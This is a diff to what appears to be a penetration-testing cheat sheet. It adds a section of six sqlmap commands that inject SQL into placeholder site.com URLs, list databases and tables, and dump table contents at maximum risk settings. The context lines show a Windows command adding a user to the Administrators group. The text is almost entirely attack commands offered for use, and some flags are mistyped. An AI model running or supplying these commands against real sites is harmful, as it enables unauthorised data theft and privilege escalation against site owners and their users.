@@ -141,5 +141,13 @@ Severity: Low        Severity: Medium           Severity: High
 | net localgroup Administrators Test /Add
 Successfully created the "Test" user account.
 ```
-
-
+### 14 SQL Injection with SQLmap:
+  ```
+  $ sqlmap -u http://site.com?id=1 --cookie="cookies" --risk 3 --level 5 --dbms=mysql --dbs
+  $ sqlmap -u "http://site.com/sqli/?id=1&Submit=Submit" --cookie="cookies1;cookies2" --data="data" --risk 3 -level 5 --dbms=mysql --dbs
+  $ sqlmap -u "http://site.com/sqli/cookies.php" --cookie="cookies1;cookies2" --data="data" -p id --risk 3 -level 5 --dbms=mysql --dbs
+  $ sqlmap -r test.txt --batch --risk 3 --level 4 --dbs
+  $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename --tables
+  $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename -T tables name --dump
+```
+### 15. 
